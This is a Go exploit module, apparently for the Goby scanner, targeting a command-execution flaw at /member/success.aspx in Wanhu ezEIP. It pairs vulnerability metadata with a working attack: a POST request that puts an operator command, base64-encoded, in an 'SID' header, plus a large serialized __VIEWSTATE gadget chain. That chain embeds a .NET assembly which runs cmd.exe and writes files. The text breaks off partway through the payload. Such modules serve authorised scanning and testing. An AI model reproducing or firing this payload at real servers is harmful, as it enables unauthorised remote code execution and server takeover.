package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Wanhu-ez-EIP /member/success.aspx Command Execution Vulnerability",
    "Description": "<p>Wando ezEIP is an enterprise resource planning software designed to help organisations manage all aspects of their business processes. It provides an integrated set of solutions covering various areas such as finance, supply chain management, sales and marketing, and human resources. This vulnerability allows an attacker to execute arbitrary code on the server side, write a post script, gain server privileges, and then take control of the entire web server.</p>",
    "Product": "Wanhu-ez-EIP",
    "Homepage": "https://www.wanhu.com.cn/gongsixinxi/",
    "DisclosureDate": "2024-05-31",
    "PostTime": "2024-05-31",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "(header=\"X-Powered-By: ezEIP\" && (body=\"Powered By wanhu - www.wanhu.com.cn\" || body=\"ezeip\" || header=\"Set-Cookie: ASP.net_sessionid=\" || body=\"whir.ajax.js\") && header!=\"Set-Cookie: PbootSystem\" && header!=\"301 Moved\" && body!=\"css_whir.css\") || (banner=\"X-Powered-By: ezEIP\" && banner=\"Set-Cookie: ASP.net_sessionid=\" && (banner!=\"Set-Cookie: PbootSystem\" && banner!=\"301 Moved\" && banner!=\"Server: Microsoft-IIS\"))",
    "GobyQuery": "(header=\"X-Powered-By: ezEIP\" && (body=\"Powered By wanhu - www.wanhu.com.cn\" || body=\"ezeip\" || header=\"Set-Cookie: ASP.net_sessionid=\" || body=\"whir.ajax.js\") && header!=\"Set-Cookie: PbootSystem\" && header!=\"301 Moved\" && body!=\"css_whir.css\") || (banner=\"X-Powered-By: ezEIP\" && banner=\"Set-Cookie: ASP.net_sessionid=\" && (banner!=\"Set-Cookie: PbootSystem\" && banner!=\"301 Moved\" && banner!=\"Server: Microsoft-IIS\"))",
    "Level": "3",
    "Impact": "<p>This vulnerability allows an attacker to execute arbitrary code on the server side, write a post script, gain server privileges, and then take control of the entire web server.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"https://www.wanhu.com.cn/gongsixinxi/\">https://www.wanhu.com.cn/gongsixinxi/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls. </p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "万户ezEIP企业管理系统 /member/success.aspx 命令执行漏洞",
            "Product": "万户网络-ezEIP",
            "Description": "<p>万户ezEIP是一种企业资源规划软件，旨在帮助企业管理其各个方面的业务流程。它提供了一套集成的解决方案，涵盖了财务、供应链管理、销售和市场营销、人力资源等各个领域。攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://www.wanhu.com.cn/gongsixinxi/\" target=\"_blank\">https://www.wanhu.com.cn/gongsixinxi/</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Wanhu-ez-EIP /member/success.aspx Command Execution Vulnerability",
            "Product": "Wanhu-ez-EIP",
            "Description": "<p>Wando ezEIP is an enterprise resource planning software designed to help organisations manage all aspects of their business processes. It provides an integrated set of solutions covering various areas such as finance, supply chain management, sales and marketing, and human resources. This vulnerability allows an attacker to execute arbitrary code on the server side, write a post script, gain server privileges, and then take control of the entire web server.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"https://www.wanhu.com.cn/gongsixinxi/\" target=\"_blank\">https://www.wanhu.com.cn/gongsixinxi/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.&nbsp;</p><p>3. Keep the system off the public web if it is not necessary.<br></p>",
            "Impact": "<p>This vulnerability allows an attacker to execute arbitrary code on the server side, write a post script, gain server privileges, and then take control of the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10957"
}`

	setPayloadRequestHash0001 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}
		//漏洞url地址
		url := "/member/success.aspx"
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
			"Accept":          "*/*",
			"Connection":      "close",
			"SID":             base64.StdEncoding.EncodeToString([]byte(command)),
			"Content-Type":    "application/x-www-form-urlencoded",
			"TYPE":            "C",
		}
		data := "__VIEWSTATE=%2FwEyiGEAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAV1N5c3RlbS5XaW5kb3dzLkZvcm1zLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQUBAAAAIVN5c3RlbS5XaW5kb3dzLkZvcm1zLkF4SG9zdCtTdGF0ZQEAAAARUHJvcGVydHlCYWdCaW5hcnkHAgIAAAAJAwAAAA8DAAAAxy8AAAIAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAQBAAAAf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0DAAAABl9pdGVtcwVfc2l6ZQhfdmVyc2lvbgUAAAgICQIAAAAKAAAACgAAABACAAAAEAAAAAkDAAAACQQAAAAJBQAAAAkGAAAACQcAAAAJCAAAAAkJAAAACQoAAAAJCwAAAAkMAAAADQYHAwAAAAEBAAAAAQAAAAcCCQ0AAAAMDgAAAGFTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQQAAABqU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLlNlcmlhbGl6YXRpb24uQWN0aXZpdHlTdXJyb2dhdGVTZWxlY3RvcitPYmplY3RTdXJyb2dhdGUrT2JqZWN0U2VyaWFsaXplZFJlZgIAAAAEdHlwZQttZW1iZXJEYXRhcwMFH1N5c3RlbS5Vbml0eVNlcmlhbGl6YXRpb25Ib2xkZXIOAAAACQ8AAAAJEAAAAAEFAAAABAAAAAkRAAAACRIAAAABBgAAAAQAAAAJEwAAAAkUAAAAAQcAAAAEAAAACRUAAAAJFgAAAAEIAAAABAAAAAkXAAAACRgAAAABCQAAAAQAAAAJGQAAAAkaAAAAAQoAAAAEAAAACRsAAAAJHAAAAAELAAAABAAAAAkdAAAACR4AAAAEDAAAABxTeXN0ZW0uQ29sbGVjdGlvbnMuSGFzaHRhYmxlBwAAAApMb2FkRmFjdG9yB1ZlcnNpb24IQ29tcGFyZXIQSGFzaENvZGVQcm92aWRlcghIYXNoU2l6ZQRLZXlzBlZhbHVlcwAAAwMABQULCBxTeXN0ZW0uQ29sbGVjdGlvbnMuSUNvbXBhcmVyJFN5c3RlbS5Db2xsZWN0aW9ucy5JSGFzaENvZGVQcm92aWRlcgjsUTg%2FAgAAAAoKAwAAAAkfAAAACSAAAAAPDQAAAAASAAACTVqQAAMAAAAEAAAA%2F%2F8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDABKREWMAAAAAAAAAAOAAAiELAQsAAAoAAAAGAAAAAAAAjikAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAADQpAABXAAAAAEAAAKgCAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAlAkAAAAgAAAACgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAKgCAAAAQAAAAAQAAAAMAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAEAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABwKQAAAAAAAEgAAAACAAUAlCIAAKAGAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABswAwAcAgAAAQAAEQIoAwAACigEAAAKCgZvBQAACm8GAAAKBm8HAAAKbwgAAAoGbwkAAApvCgAACnIBAABwbwsAAAoLFo0JAAABDH4MAAAKDQclEwg5lQEAABEIcgsAAHAoDQAACi0nEQhyDwAAcCgNAAAKOrsAAAARCHITAABwKA0AAAo6DgEAADhgAQAAcw4AAAoTBBEEbw8AAApyGQAAcG8QAAAKKBEAAAoGbwkAAApvCgAACnIpAABwbwsAAAooEgAACm8TAAAKEwURBG8PAAAKcjEAAHARBSgUAAAKbxUAAAoRBG8PAAAKF28WAAAKEQRvDwAAChdvFwAAChEEbw8AAAoWbxgAAAoRBG8ZAAAKJhEEbxoAAApvGwAAChMGBm8HAAAKEQZvHAAACji7AAAABm8JAAAKbx0AAApyOQAAcG8LAAAKKBIAAAoMKBEAAAoGbwkAAApvHQAACnJJAABwbwsAAAooEgAACm8TAAAKDQZvBQAACglvHgAACggoHwAACgZvBwAACnJTAABwbxwAAAorVwZvCQAACm8dAAAKcjkAAHBvCwAACigSAAAKDCgRAAAKBm8JAAAKbx0AAApySQAAcG8LAAAKKBIAAApvEwAACg0JCCgfAAAKBm8HAAAKclMAAHBvHAAACt4gEwcGbwcAAApyWQAAcBEHbyAAAAooFAAACm8cAAAK3gAGbwcAAApvIQAACgZvBwAACm8iAAAKKkEcAAAAAAAAIgAAAMMBAADlAQAAIAAAABIAAAFCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAAAMAgAAI34AAHgCAAD8AgAAI1N0cmluZ3MAAAAAdAUAAGQAAAAjVVMA2AUAABAAAAAjR1VJRAAAAOgFAAC4AAAAI0Jsb2IAAAAAAAAAAgAAAUcUAgAJAAAAAPolMwAWAAABAAAAEgAAAAIAAAABAAAAIgAAAAIAAAABAAAAAQAAAAMAAAAAAAoAAQAAAAAABgApACIABgBWADYABgB2ADYACgCoAJ0ACgDAAJ0ACgDoAJ0ACgAIAZ0ADgA%2FASABBgBoASIABgBtASIADgCZAYYBDgChAYYBBgDZAc0BBgDrASIABgB8AnICBgCcAnICBgDIAnICBgDbAiIAAAAAAAEAAAAAAAEAAQAAABAAFwAAAAUAAQABAFAgAAAAAIYYMAAKAAEAEQAwAA4AGQAwAAoACQAwAAoAIQC0ABwAIQDSACEAKQDdAAoAIQD1ACYAMQACAQoAIQAUASsAOQBTATAAQQBfATUAUQB0AToAUQB6AT0AWQAwAAoAWQCyAUMAYQDAAUgAaQDiAU0AcQDzAVIAaQAEAlgAUQAOAl4AYQAVAkgAYQAjAmQAYQA%2BAmQAYQBYAmQAWQBsAmkAWQCJAm0AgQCnAnIAMQCxAkgAOQC3AjAAKQDAAjUAiQDNAnYAkQDlAnIAMQDxAgoAMQD3AgoALgALAI0ALgATAJYAfQAEgAAAAAAAAAAAAAAAAAAAAACUAAAABAAAAAAAAAAAAAAAAQAZAAAAAAAEAAAAAAAAAAAAAAATAJ0AAAAAAAQAAAAAAAAAAAAAAAEAIgAAAAAAAAAAAAA8TW9kdWxlPgA0eW1ndGprZS5kbGwARQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AC5jdG9yAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQA0eW1ndGprZQBTeXN0ZW0uV2ViAEh0dHBDb250ZXh0AGdldF9DdXJyZW50AEh0dHBTZXJ2ZXJVdGlsaXR5AGdldF9TZXJ2ZXIAQ2xlYXJFcnJvcgBIdHRwUmVzcG9uc2UAZ2V0X1Jlc3BvbnNlAENsZWFyAEh0dHBSZXF1ZXN0AGdldF9SZXF1ZXN0AFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZABOYW1lVmFsdWVDb2xsZWN0aW9uAGdldF9IZWFkZXJzAGdldF9JdGVtAEJ5dGUAU3RyaW5nAEVtcHR5AG9wX0VxdWFsaXR5AFN5c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAFByb2Nlc3NTdGFydEluZm8AZ2V0X1N0YXJ0SW5mbwBzZXRfRmlsZU5hbWUAU3lzdGVtLlRleHQARW5jb2RpbmcAZ2V0X1VURjgAQ29udmVydABGcm9tQmFzZTY0U3RyaW5nAEdldFN0cmluZwBDb25jYXQAc2V0X0FyZ3VtZW50cwBzZXRfUmVkaXJlY3RTdGFuZGFyZE91dHB1dABzZXRfUmVkaXJlY3RTdGFuZGFyZEVycm9yAHNldF9Vc2VTaGVsbEV4ZWN1dGUAU3RhcnQAU3lzdGVtLklPAFN0cmVhbVJlYWRlcgBnZXRfU3RhbmRhcmRPdXRwdXQAVGV4dFJlYWRlcgBSZWFkVG9FbmQAV3JpdGUAZ2V0X0Zvcm0ATWFwUGF0aABGaWxlAFdyaXRlQWxsQnl0ZXMARXhjZXB0aW9uAGdldF9NZXNzYWdlAEZsdXNoAEVuZAAAAAlUAFkAUABFAAADQwAAA0YAAAVBAEYAAA9jAG0AZAAuAGUAeABlAAAHUwBJAEQAAAcvAGMAIAAAD2MAbwBuAHQAZQBuAHQAAAlwAGEAdABoAAAFTwBLAAAJRQBSAFIAOgAAAJOiGZzUOwNBl4v0KDM5SBUACLd6XFYZNOCJAyAAAQQgAQEICLA%2FX38R1Qo6BAAAEhEEIAASFQQgABIZBCAAEh0EIAASIQQgAQ4OAgYOBQACAg4OBCAAEjEEIAEBDgQAABI1BQABHQUOBSABDh0FBQACDg4OBCABAQIDIAACBCAAEj0DIAAOBgACAQ4dBQ8HCRIRDh0FDhItDg4SSQ4IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBAAAAXCkAAAAAAAAAAAAAfikAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHApAAAAAAAAAAAAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA%2FyUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAEwCAAAAAAAAAAAAAEwCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO%2F%2BAAABAAAAAAAAAAAAAAAAAAAAAAA%2FAAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsASsAQAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAACIAQAAAQAwADAAMAAwADAANABiADAAAAAsAAIAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAADwADQABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAANAB5AG0AZwB0AGoAawBlAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABEAA0AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAANAB5AG0AZwB0AGoAawBlAC4AZABsAGwAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAkDkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABA8AAAAfU3lzdGVtLlVuaXR5U2VyaWFsaXphdGlvbkhvbGRlcgMAAAAERGF0YQlVbml0eVR5cGUMQXNzZW1ibHlOYW1lAQABCAYhAAAA%2FgFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAGIgAAAE5TeXN0ZW0uQ29yZSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQEAAAAAcAAAAJAwAAAAoJJAAAAAoICAAAAAAKCAgBAAAAAREAAAAPAAAABiUAAAD1AlN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhYmxlYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQEgAAAAcAAAAJBAAAAAoJKAAAAAoICAAAAAAKCAgBAAAAARMAAAAPAAAABikAAADfA1N5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkiAAAAEBQAAAAHAAAACQUAAAAKCSwAAAAKCAgAAAAACggIAQAAAAEVAAAADwAAAAYtAAAA5gJTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkiAAAAEBYAAAAHAAAACQYAAAAJMAAAAAkxAAAACggIAAAAAAoICAEAAAABFwAAAA8AAAAGMgAAAO8BU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQGAAAAAcAAAAJBwAAAAoJNQAAAAoICAAAAAAKCAgBAAAAARkAAAAPAAAABjYAAAApU3lzdGVtLldlYi5VSS5XZWJDb250cm9scy5QYWdlZERhdGFTb3VyY2UEAAAABjcAAABNU3lzdGVtLldlYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2EQGgAAAAcAAAAJCAAAAAgIAAAAAAgICgAAAAgBAAgBAAgBAAgIAAAAAAEbAAAADwAAAAY5AAAAKVN5c3RlbS5Db21wb25lbnRNb2RlbC5EZXNpZ24uRGVzaWduZXJWZXJiBAAAAAY6AAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQHAAAAAUAAAANAgk7AAAACAgDAAAACQsAAAABHQAAAA8AAAAGPQAAADRTeXN0ZW0uUnVudGltZS5SZW1vdGluZy5DaGFubmVscy5BZ2dyZWdhdGVEaWN0aW9uYXJ5BAAAAAY%2BAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAeAAAAAQAAAAkJAAAAEB8AAAACAAAACQoAAAAJCgAAABAgAAAAAgAAAAZBAAAAAAlBAAAABCQAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgIAAAAIRGVsZWdhdGUHbWV0aG9kMAMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcglCAAAACUMAAAABKAAAACQAAAAJRAAAAAlFAAAAASwAAAAkAAAACUYAAAAJRwAAAAEwAAAAJAAAAAlIAAAACUkAAAABMQAAACQAAAAJSgAAAAlLAAAAATUAAAAkAAAACUwAAAAJTQAAAAE7AAAABAAAAAlOAAAACU8AAAAEQgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0a